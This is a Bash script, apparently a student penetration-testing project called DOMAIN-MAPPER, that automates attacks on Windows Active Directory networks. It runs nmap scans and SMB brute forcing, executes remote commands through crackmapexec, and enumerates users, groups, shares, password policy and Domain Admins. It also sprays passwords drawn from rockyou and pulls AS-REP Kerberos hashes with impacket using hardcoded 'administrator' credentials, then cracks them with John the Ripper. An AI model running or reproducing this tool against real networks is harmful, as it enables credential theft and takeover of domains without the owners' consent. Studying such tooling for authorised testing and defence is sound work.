#!/bin/bash
clear


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

figlet_use()
{
#checking first if figlet is already installed ******
if command -v figlet >/dev/null 2>&1
then
	figlet -f small "DOMAIN-MAPPER"
	echo "[*] From here the tool will run automatically."
	echo
	sleep 2
	echo "# This tool scans and enumerates domains and networks."
	echo
	sleep 2
	echo "# Developed by: Liad Bahari"
	echo "# Date: 01/06/25"
	echo
	echo -e "${BLUE} # For help, run this script with --help or -h option.${NC}"
	sleep 2
	echo
	echo -e "${GREEN} All the results will be save to $(pwd)/Results ${NC}"
	sleep 3
else
	echo "====== DOMAIN MAPPER TOOL ======"
fi
sleep 3
echo
}

#echo -e "${BLUE} example ${NC}"
#echo -e "${GREEN} example ${NC}"
#echo -e "${YELLOW} example ${NC}"
#echo -e "${RED} example ${NC}"


#root - checking: function.
root()
{
if [ "$(whoami)" = "root" ] 
then
echo -e "${YELLOW} You are root. Great. ${NC}"
else
echo -e "${RED} You are not root. please try again using root privs."
exit 1
fi
sleep 1
}

########
############      Credit to - https://chatgpt.com/ - ChatGPT          ##############
help_menu() 
{
	echo
    echo -e "${YELLOW}Usage:${NC} JMagen773630.S9.ZX305.sh [OPTION]"
    echo
    echo -e "${YELLOW}Available Modes:${NC}"
    echo

    echo -e "${GREEN}1. Scanning Mode${NC}"
    echo -e "  ${GREEN}-1${NC}  Basic:"
    echo "      - Use the -Pn option in Nmap to assume all hosts are online (skip discovery phase)."
    echo
    echo -e "  ${GREEN}-2${NC}  Intermediate:"
    echo "      - Perform a full port scan on all 65535 TCP ports using the -p- flag."
    echo
    echo -e "  ${GREEN}-3${NC}  Advanced:"
    echo "      - Include UDP scanning (-sU) for deeper analysis of the network."

    echo
    echo -e "${GREEN}2. Enumeration Mode${NC}"
    echo -e "  ${GREEN}-1${NC}  Basic:"
    echo "      - Identify services with Nmap (-sV)."
    echo "      - Detect the IP of the Domain Controller."
    echo "      - Detect the IP of the DHCP server."
    echo
    echo -e "  ${GREEN}-2${NC}  Intermediate:"
    echo "      - Enumerate IPs of services: FTP, SSH, SMB, WinRM, LDAP, RDP."
    echo "      - Enumerate shared folders (SMB)."
    echo "      - Run 3 NSE scripts for domain enumeration."
    echo
    echo -e "  ${GREEN}-3${NC}  Advanced (with AD credentials):"
    echo "      - Extract all users."
    echo "      - Extract all groups."
    echo "      - Extract all shares."
    echo "      - Display domain password policy."
    echo "      - Find disabled accounts."
    echo "      - Find accounts with passwords that never expire."
    echo "      - Identify members of the Domain Admins group."

    echo
    echo -e "${GREEN}3. Exploitation Mode${NC}"
    echo -e "  ${GREEN}-1${NC}  Basic:"
    echo "      - Run the Nmap NSE 'vuln' script to detect known vulnerabilities."
    echo
    echo -e "  ${GREEN}-2${NC}  Intermediate:"
    echo "      - Perform password spraying using crackmapexec across the domain."
    echo
    echo -e "  ${GREEN}-3${NC}  Advanced:"
    echo "      - Extract Kerberos AS-REP hashes (GetNPUsers) using supplied credentials."
    echo "      - Crack them with John the Ripper using a provided password list."

    echo
    echo -e "${YELLOW}Other Options:${NC}"
    echo -e "  ${GREEN}-h, --help${NC}      Show this help message and exit"
    echo
    exit 0
}
#if the user wants to see the help-menu:
if [[ "$1" == "-h" || "$1" == "--help" ]]
then
	help_menu
fi

user_choice()
{
######## 1. Getting the User Input ########

#1.1 Prompt the user to enter the target network range for scanning.

while true
do
echo
read -p "[*] Please Enter a network you want to scan (like: 192.168.1.0/24 - with CIDR):" Network
if [[ "$Network" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/(3[0-2]|[1-2]?[0-9])$ ]]
then
	echo -e "[*]${BLUE} Ip is OK. we are moving ${NC}"
	break
else
	echo -e "[*]${RED} Ip is not valid, try again maybe CIDR is missing....${NC}"
fi
done

#1.2. Ask for the Domain name and Active Directory (AD) credentials.

echo
sleep 2
echo -e "${GREEN} Enter your Domain Name: ${NC}"
read domain_name

echo -e "${GREEN} Enter your AD Username: ${NC}"
read ad_username
echo "[!] It is recommended to give a user with high privileges."
sleep 1

echo -e "${GREEN} Enter your AD Password: ${NC}"
read  ad_password
echo
sleep 1
clear

#echo
#echo -e "${BLUE} Connecting to domain: $domain_name ${NC}"
#echo
#sleep 1


#1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
read -p "Use your own password list? (y/N): " lst
if [[ "$lst" =~ ^[Yy]$ ]]
then
        read -p "Enter full path: " path
        if [ -f "$path" ]
then    
	password_list="$path"
	echo "$password_list"
	sleep 2
else
        echo "File not found"
        exit 1
fi
else
        password_list="/usr/share/wordlists/rockyou.txt"
fi
clear

#Creating directory for the files.
echo -e "${GREEN} [*] Creating directory for the files...${NC}"  
dir="$(pwd)/Results"
mkdir -p "$dir"
echo
echo -e "${BLUE} [*] Directory $(pwd)/Results has been created (: ${NC}"
sleep 3
echo
#1.4. Require the user to select a desired operation level (Basic, Intermediate, Advanced or None) for each mode: Scanning, Enumeration, Exploitation.
echo "[*] we move on --->"
sleep 1
echo

echo -e "${GREEN} Choose SCANNING level (1-Basic, 2-Intermediate, 3-Advanced, 0-None): ${NC}"
read scan

echo -e "${YELLOW} Choose ENUMERATION level (1-Basic, 2-Intermediate, 3-Advanced, 0-None): ${NC}"
read enum

echo -e "${BLUE} Choose EXPLOITATION level (1-Basic, 2-Intermediate, 3-Advanced, 0-None): ${NC}"
read exploit

echo
#for pdf making
echo -e "${GREEN} We need to download 'enscript' to make the PDF files.${NC}"
echo
check_and_install() 
{
local pkg="$1"
if ! command -v "$pkg" &>/dev/null
then
	echo "[!] $pkg is not installed."
	sudo apt install -y "$pkg"
else
	echo "[✔] $pkg is already installed."
fi
}
check_and_install enscript
echo
sleep 2
echo

#not critical
#creating file for only open IP's from all the network:
nmap -sn $Network | grep "Nmap scan report for" | awk '{print $5}' > $dir/Open_IP
}

Scanning()
{
###############################
#SCANNING;
###############################
echo
echo -e "${YELLOW} * Scanning Mode ${NC}--->"

#2.1. Basic: Use the -Pn option in Nmap to assume all hosts are online, bypassing the discovery phase.
mkdir -p "$dir/Scanning"

#scan-0
if [[ "$exploit" == "0" ]]
then
    clear
    sleep 1
fi

#scan-1
if [[ "$scan" == "1" ]]
then
	echo "Running BASIC scan..."
sudo nmap -Pn $Network -oN "$dir/Scanning/Basic_Scan.txt"
enscript --quiet -B -1r -f Courier9 "$dir/Scanning/Basic_Scan.txt" -o - | ps2pdf - "$dir/Scanning/Basic_Scan.pdf" && rm "$dir/Scanning/Basic_Scan.txt"
sleep 3

#### end part
	clear
	echo -e "${BLUE} Scanning part is over . ${NC}" 
	espeak "Scanning part is over" >/dev/null 2>&1 
	clear
fi

# the previous level with: +++

#2.2. Intermediate: Scan all 65535 ports using the -p- flag.
#scan-2
if [[ "$scan" == "2" ]]
then
	echo "Running INTERMEDIATE scan..."
sudo nmap -Pn $Network -p- --top-ports 100 -oN "$dir/Scanning/Intermediate_Scan.txt"
enscript --quiet -B -1r -f Courier9 "$dir/Scanning/Intermediate_Scan.txt" -o - | ps2pdf - "$dir/Scanning/Intermediate_Scan.pdf" && rm "$dir/Scanning/Intermediate_Scan.txt"
sleep 3

#### end part
	clear
	echo -e "${BLUE} Scanning part is over . ${NC}" 
	espeak "Scanning part is over" >/dev/null 2>&1 
	clear
fi

# the previous level with: +++

#2.3. Advanced: Include UDP scanning for a thorough analysis.

#scan-3
if [[ "$scan" == "3" ]]
then
	echo "Running ADVANCED scan..."
sudo nmap -Pn $Network -p- --top-ports 100 -sU -oN "$dir/Scanning/Advanced_Scan.txt"
enscript --quiet -B -1r -f Courier9 "$dir/Scanning/Advanced_Scan.txt" -o - | ps2pdf - "$dir/Scanning/Advanced_Scan.pdf" && rm "$dir/Scanning/Advanced_Scan.txt"
sleep 3

#### end part
	clear
	echo -e "${BLUE} Scanning part is over . ${NC}" 
	espeak "Scanning part is over" >/dev/null 2>&1 
	clear
fi

sleep 3
clear
}

Enumeration()
{
###############################
#ENUMERATION:
###############################
echo -e "${YELLOW} * Enumeration Mode ${NC} --->"

#3.1.1. Identify services (-sV) running on open ports.
#3.1.2. Identify the IP Address of the Domain Controller.
#3.1.3. Identify the IP Address of the DHCP server.

#enum-0
if [[ "$exploit" == "0" ]]
then
    clear
    sleep 1
fi

#enum-1
if [[ "$enum" == "1" ]]
then
	mkdir -p "$dir/Enum_Basic"
	echo "Running BASIC enumeration..."
	sleep 1
	echo
	#3.1.1.
	nmap -sV $Network -oN "$dir/Enum_Basic/ServicesScan.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Basic/ServicesScan.txt" -o - | ps2pdf - "$dir/Enum_Basic/ServicesScan.pdf" && rm "$dir/Enum_Basic/ServicesScan.txt"
	echo
	echo -e "{*} ${BLUE} Service Detection Done!." 
	sleep 1
	echo
	#3.1.2.
	echo -e "[*] ${GREEN} Starting CME for the DC - IP Address:${NC}"
	echo
	sleep 1
	crackmapexec smb $Network -x "ipconfig" | grep 'DC' | awk '{print $2}' | tee "$dir/Enum_Basic/DC_IP.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Basic/DC_IP.txt" -o - | ps2pdf - "$dir/Enum_Basic/DC_IP.pdf" && rm "$dir/Enum_Basic/DC_IP.txt"
	echo
	sleep 1
	echo
	#3.1.3.
	echo -e "[*] ${GREEN} DHCP Server IP:${NC}"
	crackmapexec smb $Network -u $ad_username -p $ad_password -x 'ipconfig /all' | grep "DHCP Server" | awk '{print $NF}' | tee "$dir/Enum_Basic/dhcp_ip.txt"
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Basic/dhcp_ip.txt" -o - | ps2pdf - "$dir/Enum_Basic/dhcp_server.pdf" && rm "$dir/Enum_Basic/dhcp_ip.txt"
	echo
	
#### end part
	clear
	echo -e "${BLUE} Enumerartion part is over . ${NC}" 
	espeak "Enumerartion part is over" >/dev/null 2>&1 
	clear
fi

# the previous level with: +++

#3.2.1. Enumerate IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP.
#3.2.2. Enumerate shared folders.
#3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain networks.

#enum-2
if [[ "$enum" == "2" ]]
then
	mkdir -p "$dir/Enum_Intermediate"
	echo "Running Intermediate enumeration..."
	sleep 1
	echo
	#3.1.1.
	nmap -sV $Network -oN "$dir/Enum_Intermediate/ServicesScan.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/ServicesScan.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/ServicesScan.pdf" && rm "$dir/Enum_Intermediate/ServicesScan.txt"
	echo
	echo -e "{*} ${BLUE} Service Detection Done!." 
	sleep 1
	echo
	#3.1.2.
	echo -e "[*] ${GREEN} Starting CME for the DC - IP Address:${NC}"
	echo
	sleep 1
	crackmapexec smb $Network -x "ipconfig" | grep 'DC' | awk '{print $2}' | tee "$dir/Enum_Intermediate/DC_IP.txt"
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/DC_IP.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/DC_IP.pdf" && rm "$dir/Enum_Intermediate/DC_IP.txt" 
	sleep 1
	echo
	#3.1.3.
	echo -e "[*] ${GREEN} DHCP Server IP:${NC}"
	crackmapexec smb $Network -u $ad_username -p $ad_password -x 'ipconfig /all' | grep "DHCP Server" | awk '{print $NF}' | tee "$dir/Enum_Intermediate/dhcp_ip.txt"
	echo
	sleep 2
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/dhcp_ip.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/dhcp_server.pdf" && rm "$dir/Enum_Intermediate/dhcp_ip.txt"
	echo
	
	clear
	echo -e "${BLUE} continue of the intermidiate:${NC}"
	######          +++++
	#3.2 - Intermediate bonus.
	#3.2.1
	echo -e "${GREEN} IP's from some Services:${NC}"
	echo
	nmap -p 21,22,445,5985,5986,389,636,3389 -sS -T4 -Pn $Network |grep "Nmap scan report for" | awk '{print $5}' | cut -d' ' -f1 > "$dir/Enum_Intermediate/IP's_enum.txt" 
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/IP's_enum.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/IP's_enum.pdf" && rm "$dir/Enum_Intermediate/IP's_enum.txt"
	echo
	sleep 2
	#3.2.2
	echo
	sleep 1
	echo -e "${GREEN} shared folders in the relevant domain:${NC}"
	echo
	crackmapexec smb $Network -u $ad_username -p $ad_password --shares > "$dir/Enum_Intermediate/enum_folders.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/enum_folders.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/enum_folders.pdf" && rm "$dir/Enum_Intermediate/enum_folders.txt"
	echo
	sleep 2
	#3.2.3
	clear
	nmap --script smb-protocols,smb-os-discovery,smb-brute -iL $dir/Open_IP -oN "$dir/Enum_Intermediate/3_NSE.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Intermediate/3_NSE.txt" -o - | ps2pdf - "$dir/Enum_Intermediate/3_NSE.pdf" && rm "$dir/Enum_Intermediate/3_NSE.txt"
	sleep 3
	
#### end part
	clear
	echo -e "${BLUE} Enumerartion part is over . ${NC}" 
	espeak "Enumerartion part is over" >/dev/null 2>&1 
	clear
fi

# the previous level with: +++

#3.3.1. Extract all users.
#3.3.2. Extract all groups.
#3.3.3. Extract all shares.
#3.3.4. Display password policy.
#3.3.5. Find disabled accounts.
#3.3.6. Find never-expired accounts.
#3.3.7. Display accounts that are members of the Domain Admins group.

#enum-3
if [[ "$enum" == "3" ]]
then
	mkdir -p $dir/Enum_Advanced
	echo "Running ADVANCED enumeration..."
	sleep 1
	echo
	nmap -sV $Network -oN "$dir/Enum_Advanced/ServicesScan.txt"
	echo
	echo -e "{*} ${BLUE} Service Detection Done!." 
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/ServicesScan.txt" -o - | ps2pdf - "$dir/Enum_Advanced/ServicesScan.pdf" && rm "$dir/Enum_Advanced/ServicesScan.txt"
	sleep 1
	echo
	echo -e "[*] ${GREEN} Starting CME for the DC - IP Address:${NC}"
	echo
	sleep 1
	crackmapexec smb $Network -x "ipconfig" | grep 'DC' | awk '{print $2}' | tee "$dir/Enum_Advanced/DC_IP.txt"
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/DC_IP.txt" -o - | ps2pdf - "$dir/Enum_Advanced/DC_IP.pdf" && rm "$dir/Enum_Advanced/DC_IP.txt"
	sleep 1
	echo
	echo -e "[*] ${GREEN} DHCP Server IP:${NC}"
	crackmapexec smb $Network -u $ad_username -p $ad_password -x 'ipconfig /all' | grep "DHCP Server" | awk '{print $NF}' > "$dir/Enum_Advanced/dhcp_ip.txt"
	cat "$dir/Enum_Advanced/dhcp_ip.txt"
	sleep 2
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/dhcp_ip.txt" -o - | ps2pdf - "$dir/Enum_Advanced/dhcp_server.pdf" && rm "$dir/Enum_Advanced/dhcp_ip.txt"
	echo
	sleep 1
	
	clear
	echo -e "${BLUE} continue of the intermidiate:${NC}"
	######          +++++
	#3.2 - Intermediate.
	#3.2.1
	echo -e "${GREEN} IP's from some Services:${NC}"
	echo
	nmap -p 21,22,445,5985,5986,389,636,3389 -sS -T4 -Pn $Network |grep "Nmap scan report for" | awk '{print $5}' | cut -d' ' -f1 |tee "$dir/Enum_Advanced/IP's_enum_list.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/IP's_enum_list.txt" -o - | ps2pdf - "$dir/Enum_Advanced/IP's_enum_list.pdf" && rm "$dir/Enum_Advanced/IP's_enum_list.txt"
	echo
	sleep 3
	#3.2.2
	echo
	sleep 1
	echo -e "${GREEN} shared folders in the relevant domain:${NC}"
	echo
	crackmapexec smb $Network -u $ad_username -p $ad_password --shares 
	echo
	sleep 2
	#3.2.3
	#3 NSE scripts.
	clear
	echo -e "${YELLOW} strating 3 types of NSE with nmap. ${NC}"
	nmap --script smb-protocols,smb-os-discovery,smb-brute -iL $dir/Open_IP -oN "$dir/Enum_Advanced/3_NSE.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/3_NSE.txt" -o - | ps2pdf - "$dir/Enum_Advanced/3_NSE.pdf" && rm "$dir/Enum_Advanced/3_NSE.txt"
	sleep 3
	clear
ip_only=$(echo "$Network" | cut -d'/' -f1)
#####
#  +++  Advanced Bonus.
#####	
	echo -e "${GREEN} checking if you enterd credentials..${NC}"
	sleep 1
	if [[ -n "$ad_username" && -n "$ad_password" ]]
then
	echo "[*] OK, continue."
	echo
	#3.3.1.
	echo -e "${YELLOW} Extracting the users that are in the domain. ${NC}"
	enum4linux $ip_only | grep "Known Usernames" | sed 's/.*Known Usernames *.. *//' | tr -d ',' | tr ' ' '\n' | sed '/^$/d' | tee "$dir/Enum_Advanced/users.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/users.txt" -o - | ps2pdf - "$dir/Enum_Advanced/users.pdf" && rm "$dir/Enum_Advanced/users.txt"
	sleep 2
	echo
	#3.3.2.
	echo -e "${YELLOW} Extracting the domain's groups. ${NC}"
    crackmapexec smb $Network -u $ad_username -p $ad_password --groups | grep "membercount:" | sed -E 's/.*DC +//' | awk -F'membercount:' '{printf "%-50s %s\n", $1, $2}'|tee "$dir/Enum_Advanced/groups.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/groups.txt" -o - | ps2pdf - "$dir/Enum_Advanced/groups.pdf" && rm "$dir/Enum_Advanced/groups.txt"
	sleep 5
	echo
	#3.3.3.
	echo -e "${YELLOW} Extracting the shares in the domain. ${NC}"
	crackmapexec smb $Network -u $ad_username -p $ad_password --shares 2>/dev/null | grep -E '^\s*SMB\s+[0-9.]+' | awk '{print $8}' | grep -vE '445|Permissions|Enumerated|Remark|-----' |tee  "$dir/Enum_Advanced/shared_folders.txt"	
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/shared_folders.txt" -o - | ps2pdf - "$dir/Enum_Advanced/shared_folders.pdf" && rm "$dir/Enum_Advanced/shared_folders.txt"
	echo
	sleep 3
	clear
	#3.3.4.
	echo -e "${YELLOW} Displaying the 'DC' password - policy. ${NC}"
	echo
	crackmapexec smb $Network -u $ad_username -p $ad_password -X 'Get-ADDefaultDomainPasswordPolicy' | grep -E 'ComplexityEnabled|Lockout|MaxPasswordAge|MinPasswordAge|MinPasswordLength|PasswordHistoryCount|ReversibleEncryptionEnabled' | tee "$dir/Enum_Advanced/pass_policy.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/pass_policy.txt" -o - | ps2pdf - "$dir/Enum_Advanced/pass_policy.pdf" && rm "$dir/Enum_Advanced/pass_policy.txt"
	echo 
	sleep 3
	#3.3.5.
	echo -e "${YELLOW} Displaying the disabled accounts in the domain . ${NC}"
	echo
	sleep 1
	crackmapexec smb $Network -u $ad_username -p $ad_password -X "Get-ADUser -Filter 'Enabled -eq \$false' | Select-Object Name, SamAccountName, Enabled" |tee "$dir/Enum_Advanced/Disabled_accounts.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/Disabled_accounts.txt" -o - | ps2pdf - "$dir/Enum_Advanced/Disabled_accounts.pdf" && rm "$dir/Enum_Advanced/Disabled_accounts.txt"
	echo
	sleep 3
	#3.3.6.
	echo -e "${YELLOW} preparing to show 'never-expired' password . ${NC}"
	echo
	sleep 2
	crackmapexec smb $Network -u $ad_username -p $ad_password -X "Get-ADUser -Filter 'PasswordNeverExpires -eq \$true' -Properties PasswordNeverExpires | Select-Object SamAccountName,PasswordNeverExpires" | tee "$dir/Enum_Advanced/NeverEXPassword.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/NeverEXPassword.txt" -o - | ps2pdf - "$dir/Enum_Advanced/NeverEXPassword.pdf" && rm "$dir/Enum_Advanced/NeverEXPassword.txt"
	echo
	sleep 3
	#3.3.7.
	echo "."
	echo ".."
	echo -e "${YELLOW} preparing to show the Users that are members in Admin - groups . ${NC}"
	crackmapexec smb $Network -u $ad_username -p $ad_password -X "Get-ADGroupMember -Identity 'Domain Admins' | Get-ADUser -Properties SID | Select-Object Name, SamAccountName, SID, DistinguishedName" | tee "$dir/Enum_Advanced/DomainADMINS.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Enum_Advanced/DomainADMINS.txt" -o - | ps2pdf - "$dir/Enum_Advanced/DomainADMINS.pdf" && rm "$dir/Enum_Advanced/DomainADMINS.txt"
	echo
	sleep 1

#### end part
	clear
	echo -e "${BLUE} Enumerartion part is over . ${NC}" 
	espeak "Enumerartion part is over" >/dev/null 2>&1 
	clear
else
    echo echo -e "${RED} without credantials we can not continue this part. ): ${NC}"
    sleep 1
    exit 1
fi

fi

}
Exploitation()
{
###############################
#EXPLOITATION:
###############################

#exploit-0
if [[ "$exploit" == "0" ]]
then
    clear
	return
fi

echo -e "${YELLOW} * Exploitation Mode ${NC} --->"

#4.1. Basic: Deploy the NSE vulnerability scanning script.
mkdir -p "$dir/Exploitation"

###
#making users list with you input:
read -p "[*] please enter usernames file-name you want to make: " user_file < /dev/tty
echo "[*] Ok. now, please enter one username on per line: [To finish, enter 'done'.]"
> "$dir/$user_file.txt"

while true
do
read -p "username: " username < /dev/tty
if [[ "$username" == "done" ]]
then
	break
fi
echo "$username" >> "$dir/$user_file.txt"
done
echo "usernames saved to $dir/$user_file.txt ✅."
sleep 3
echo

#########
############# Begginning
#########

#exploit-1
if [[ "$exploit" == "1" ]]
then
	clear
	echo "Running BASIC exploitation..."
#4.1.
	nmap -sV --script vuln -T4 -F $Network -oN "$dir/Exploitation/Exploit_vuln.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/Exploit_vuln.txt" -o - | ps2pdf - "$dir/Exploitation/Exploit_vuln.pdf" && rm "$dir/Exploitation/Exploit_vuln.txt"
	sleep 2
	
#### end part
	clear
	echo -e "${BLUE} Exploitation part is over . ${NC}"
	espeak "Exploitation part is over" >/dev/null 2>&1
	clear
fi

# the previous level with: +++

#4.2. Intermediate: Execute domain-wide password spraying to identify weak credentials.

#exploit-2
if [[ "$exploit" == "2" ]]
then
#4.1.
	clear
	echo "[*] Running Intermediate exploitation..."
	echo	
	nmap -sV --script vuln -T4 -F $Network -oN "$dir/Exploitation/Exploit_vuln.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/Exploit_vuln.txt" -o - | ps2pdf - "$dir/Exploitation/Exploit_vuln.pdf" && rm "$dir/Exploitation/Exploit_vuln.txt"
	sleep 2
	# ++ Intermediate Exploitation:
echo	

#4.2.
echo -e "${GREEN} Starting password spraying to identify weak credentials. ${NC}"
crackmapexec smb "$Network" -u "$dir/$user_file.txt" -p "$password_list" | grep '\[+\]' | tee "$dir/Exploitation/pass_spraying.txt"
enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/pass_spraying.txt" -o - | ps2pdf - "$dir/Exploitation/pass_spraying.pdf" && rm "$dir/Exploitation/pass_spraying.txt"
sleep 2
echo

#### end part
	clear
	echo -e "${BLUE} Exploitation part is over . ${NC}"
	espeak "Exploitation part is over" >/dev/null 2>&1
	clear
fi




# the previous level with: +++

#4.3. Advanced: Extract and attempt to crack Kerberos tickets using pre-supplied passwords.

#exploit-3
if [[ "$exploit" == "3" ]]
then
	echo "Running ADVANCED exploitation..."
	#4.1.
	nmap -sV --script vuln -T4 -F $Network -oN "$dir/Exploitation/Exploit_vuln.txt"
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/Exploit_vuln.txt" -o - | ps2pdf - "$dir/Exploitation/Exploit_vuln.pdf" && rm "$dir/Exploitation/Exploit_vuln.txt"
	sleep 2
#+
	#4.2
	echo
	sleep 1
	echo -e "${GREEN} Starting password spraying to identify weak credentials. ${NC}"
	crackmapexec smb $Network -u "$dir/$user_file.txt" -p "$password_list" | grep '\[+\]' | tee "$dir/Exploitation/pass_spraying.txt"
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/pass_spraying.txt" -o - | ps2pdf - "$dir/Exploitation/pass_spraying.pdf" && rm "$dir/Exploitation/pass_spraying.txt"
	sleep 2
	echo
	clear
#+	
	#4.3.
	#Extracting.
	echo -e "${GREEN} Starting to Extract and find kerberos tickets. ${NC}"
	echo "$Network" | cut -d'/' -f1 > "$dir/DC_IP"
	DC_IP=$(cat "$dir/DC_IP")
	impacket-GetNPUsers mydomain.local/administrator:1234567aA -dc-ip $DC_IP -outputfile "$dir/Exploitation/KRBhash.txt"
	sleep 3
	echo
	#cracking
	echo -e "${GREEN} trying to crack the kerberos tickets were found. ${NC}"
	john --format=krb5asrep --wordlist="$password_list" "$dir/Exploitation/KRBhash.txt" > "$dir/Exploitation/John_Crack.txt"  2>/dev/null </dev/null
	echo
	sleep 1
	echo -e "${GREEN} John results have been saved to $dir/Exploitation/John_Crack.pdf. ${NC}"
	echo
	sleep 2
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/John_Crack.txt" -o - | ps2pdf - "$dir/Exploitation/John_Crack.pdf" && rm "$dir/Exploitation/John_Crack.txt"
	echo
	enscript --quiet -B -1r -f Courier9 "$dir/Exploitation/KRBhash.txt" -o - | ps2pdf - "$dir/Exploitation/KRBhash.pdf" && rm "$dir/Exploitation/KRBhash.txt"
	sleep 2
#### end part
	clear
	echo -e "${BLUE} Exploitation part is over . ${NC}"
	espeak "Exploitation part is over" >/dev/null 2>&1
	clear
fi


}









#Running the functions:
figlet_use
root
#help_menu
user_choice
Scanning
Enumeration
Exploitation
echo
sleep 1

espeak "The project completed" >/dev/null 2>&1 &
echo -e "${GREEN}✔️ The project completed.${NC}" &
wait

espeak "and the results have been saved in 'Results' Directory" >/dev/null 2>&1 &
echo -e "${GREEN}✔️ The results have been saved in 'Results' Directory.${NC}" &
wait

sleep 3
echo -e "${YELLOW} [*] Script Finished (: "





